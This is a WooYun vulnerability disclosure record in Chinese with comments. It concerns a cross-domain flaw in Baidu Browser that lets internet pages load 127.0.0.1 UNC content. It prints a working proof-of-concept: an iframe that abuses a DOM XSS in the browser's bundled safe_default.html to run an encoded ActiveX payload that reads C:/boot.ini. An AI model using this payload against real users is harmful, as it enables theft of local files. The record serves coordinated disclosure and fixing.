{"id": 7315, "wybug_id": "wooyun-2013-042156", "wybug_title": "百度浏览器本地任意文件读取漏洞", "wybug_corp": "百度", "wybug_author": "只抽红梅", "wybug_date": "2013-11-06 17:23", "wybug_open_date": "2013-12-21 17:23", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "百度浏览器"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-21：\t细节向公众公开  简要描述： 百度浏览器在实现跨域方面存在缺陷导致该漏洞。 详细说明：  从 internet 域跨到 127.0.0.1 域会产生安全问题，所以目前大部分浏览器都进行了防御，但是百度浏览器在 IE 内核下却没有任何限制。通过下面代码可以进行测试：\n<!DOCTYPE html><html><head><meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"><meta http-equiv=\"x-ua-compatible\" content=\"ie=8\"/><title>SOP fuzz</title><body><script type=\"text/javascript\"></script>file <br/><iframe src=\"file:///c:/fuzz/alert_1.html\"></iframe><br/>file unc <br/><iframe src=\"\\\\127.0.0.1\\c$/fuzz/alert_2.html\"></iframe><br/></body></html>\nalert_1.html 和 alert_2.html 是我本地两个测试文件，通过任意 internet 域访问该页面可以发现 alert_2.html 中的代码执行了。说明百度浏览器对访问 file 域有限制，对访问 127.0.0.1 无限制。其实到这里就是漏洞的全部，为了配合对这个漏洞进行利用，我们发现百度浏览器自带的这个页面 C:\\Program Files\\baidu\\BaiduBrowser\\resource\\extension\\security\\safe_default.html 存在 dom xss。\nfunction queryHash(h){\t\t    \tvar data = (h.replace(\"#\",\"\")||\"name=360.exe360.exe360.exe360.exe360.exe360.exe360.exe360.exe360.exe360.exe360.exe360.exe360.exe&path=c:\\profile\\360.exe\").split(\"&\");\t\t\t    var obj = {};\t\t\t    for(var i=0,d;d=data[i];i++){\t\t\t    \tvar r = d.split(\"=\");\t\t\t    \tobj[r[0]] = r[1];\t\t\t    }\t\t\t    return obj;\t\t    }\t\t    var info = document.getElementById(\"info\");\t\t\tvar obj = queryHash(decodeURIComponent(location.hash).replace(\"#\", \"\"));\t\t\tdocument.getElementById(\"name\").innerHTML = obj.name;\t\t\tdocument.getElementById(\"path\").innerHTML = obj.path;\n直接就用 innerHTML 写入从 URL 中取出的内容。so，通过下面 poc，来读取本地文件：\n<iframe src='\\\\127.0.0.1\\c$/Program Files\\baidu\\BaiduBrowser\\resource\\extension\\security\\safe_default.html#name=xxx<script defer>eval(unescape(unescape(\"xmlhttp%253Dnew%2520ActiveXObject%2528%2522Msxml2.XMLHTTP.3.0%2522%2529%253Bxmlhttp.open%2528%2522GET%2522%252C%2522file%253A////127.0.0.1/c%2524/boot.ini%2522%252Cfalse%2529%253Bxmlhttp.send%2528%2529%253Balert%2528xmlhttp.responseText%2529%253B\")))</script>&path=yyy'></iframe>\n   漏洞证明：  <iframe src='\\\\127.0.0.1\\c$/Program Files\\baidu\\BaiduBrowser\\resource\\extension\\security\\safe_default.html#name=xxx<script defer>eval(unescape(unescape(\"xmlhttp%253Dnew%2520ActiveXObject%2528%2522Msxml2.XMLHTTP.3.0%2522%2529%253Bxmlhttp.open%2528%2522GET%2522%252C%2522file%253A////127.0.0.1/c%2524/boot.ini%2522%252Cfalse%2529%253Bxmlhttp.send%2528%2529%253Balert%2528xmlhttp.responseText%2529%253B\")))</script>&path=yyy'></iframe>   修复方案：  1、限定 internet 域对 127.0.0.1 域的访问。   版权声明：转载请注明来源 只抽红梅@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2013-11-11 11:33 厂商回复： 感谢对百度安全的关注，安全组立即处理此问题。--“百度，因你更安全” 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-06 17:27 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  牛鞭    \n     2013-11-06 17:27 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  拿了通用型奖金，就能抽红塔山了    \n     2013-11-06 17:28 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @疯狗 洞主只抽红梅    \n     2013-11-06 17:46 |    \t\tMr.醉心 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 爱生活，爱音乐，爱美女，更爱波多野结衣)\t\t \n  洞主只抽红梅     \n     2013-11-11 11:43 |    \t\t乌云最帅的淫 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:23        | 不以淫荡惊天下,就以闷骚动世人)\t\t \n  @疯狗 提交了一个淘宝危害很大的洞.老大速去审核下把    \n     2013-12-21 18:44 |    \t\tc4bbage \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:7        | var_dump($me);)\t\t \n  nb and nice.    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}